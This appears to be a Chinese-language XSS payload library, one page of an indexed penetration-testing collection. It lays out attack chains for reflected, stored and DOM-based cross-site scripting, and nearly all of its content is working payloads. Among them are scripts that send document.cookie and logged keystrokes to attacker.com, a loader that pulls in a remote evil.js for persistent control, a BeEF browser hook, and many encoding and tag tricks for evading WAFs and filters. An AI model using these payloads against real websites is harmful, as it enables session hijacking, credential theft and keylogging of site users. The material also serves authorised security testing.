# XSS 三大类型 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:反射型 / 存储型 / DOM 型。每个类型的典型探针、上下文识别、报告 PoC。

---

## A. 反射型 XSS

### 反射型XSS  `xss-reflected`
反射型跨站脚本攻击技术
子类：**反射型** · tags: `xss` `reflected` `javascript`

**前置条件：** 存在用户输入反射到页面；输入未经过滤或编码

**攻击链：**

**1. 1. 探测XSS注入点**
_基础XSS探测_
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onfocus=alert(1) autofocus "
```

**2. 2. 事件处理器绕过**
_使用各种事件处理器_
```
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**3. 3. 标签绕过**
_大小写混淆和标签变形_
```
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
```

**4. 4. 窃取Cookie**
_窃取用户Cookie_
```
<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
<script>location="http://attacker.com/steal?c="+document.cookie</script>
```

**5. 5. 键盘记录**
_记录用户键盘输入_
```
<script>
document.onkeypress=function(e){
  fetch("http://attacker.com/log?key="+e.key)
}
</script>
```

**WAF/EDR 绕过变体：**

**1. HTML实体编码**
_使用HTML实体编码绕过_
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
```

**2. Unicode编码**
_使用Unicode编码绕过_
```
<script>\u0061lert(1)</script>
<img src=x onerror=\u0061lert(1)>
```

**3. 双写绕过**
_双写绕过关键字删除_
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<imimgg src=x onerror=alert(1)>
```

**4. 注释混淆**
_使用注释混淆_
```
<script>/**/alert(1)/**/</script>
<img src=x/**/onerror=alert(1)>
<svg on<!--test-->load=alert(1)>
```

---

### 存储型XSS  `xss-stored`
存储型跨站脚本攻击技术
子类：**存储型** · tags: `xss` `stored` `persistent`

**前置条件：** 存在数据存储功能；存储数据未经过滤显示

**攻击链：**

**1. 1. 探测存储点**
_探测存储型XSS_
```
在评论区、用户名、个人简介等处输入:
<script>alert(1)</script>
"><script>alert(1)</script>
测试是否存储并执行
```

**2. 2. 隐蔽Payload**
_使用隐蔽的XSS payload_
```
<img src=x onerror=alert(1) style="display:none">
<svg/onload=alert(1) style="position:absolute;left:-9999px">
<div style="background:url(javascript:alert(1))">
```

**3. 3. 持久化控制**
_加载外部恶意脚本_
```
<script>
if(!window.xss_loaded){
  window.xss_loaded=true;
  var s=document.createElement("script");
  s.src="http://attacker.com/evil.js";
  document.body.appendChild(s);
}
</script>
```

**4. 4. BeEF Hook**
_使用BeEF框架控制浏览器_
```
<script src="http://beef-server:3000/hook.js"></script>
或:
<script>
var s=document.createElement("script");
s.src="http://beef-server:3000/hook.js";
document.body.appendChild(s);
</script>
```

**WAF/EDR 绕过变体：**

**1. SVG标签绕过**
_使用SVG标签绕过_
```
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1)>
```

**2. Math标签绕过**
_使用MathML标签_
```
<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>
```

---

### DOM型XSS  `xss-dom`
基于DOM的跨站脚本攻击
子类：**DOM型** · tags: `xss` `dom` `javascript`

**前置条件：** 存在JavaScript动态操作DOM；用户输入直接写入DOM

**攻击链：**

**1. 1. 探测DOM XSS**
_探测DOM型XSS_
```
#<script>alert(1)</script>
?param=<img src=x onerror=alert(1)>
检查location.hash、location.search等是否直接写入DOM
```

**2. 2. 常见Sink点**
_常见的DOM XSS Sink点_
```
document.write(location.hash)
innerHTML = location.search
eval(location.hash)
setTimeout(location.hash, 0)
jQuery(html)
$(location.hash)
```

**3. 3. location.hash利用**
_利用location.hash_
```
URL: http://target.com/#<img src=x onerror=alert(1)>
如果页面有: document.write(location.hash)
则触发XSS
```

**4. 4. postMessage利用**
_利用postMessage_
```
window.addEventListener("message", function(e){
  document.getElementById("output").innerHTML = e.data;
});
攻击页面:
targetWindow.postMessage("<img src=x onerror=alert(1)>", "*");
```

**WAF/EDR 绕过变体：**

**1. javascript:协议变体绕过**
_使用大小写混淆、HTML实体编码、制表符插入等方式绕过javascript:协议过滤_
```
javascript:alert(1)
javascript	:alert(1)
jaVaScRiPt:alert(1)
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>
```

**2. SVG/MathML标签与事件处理器绕过**
_利用SVG、MathML等非标准HTML标签及冷门事件处理器(ontoggle、onpageshow)绕过标签和事件黑名单_
```
<svg onload=alert(1)>
<svg/onload=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
<details open ontoggle=alert(1)>
<body onpageshow=alert(1)>
<input onfocus=alert(1) autofocus>
```

---


---

← 回 [00-index.md](00-index.md) · payload 被拦 → [`11-bypass.md`](11-bypass.md) · 已 pop alert,要落地利用 → [`12-exploitation.md`](12-exploitation.md)
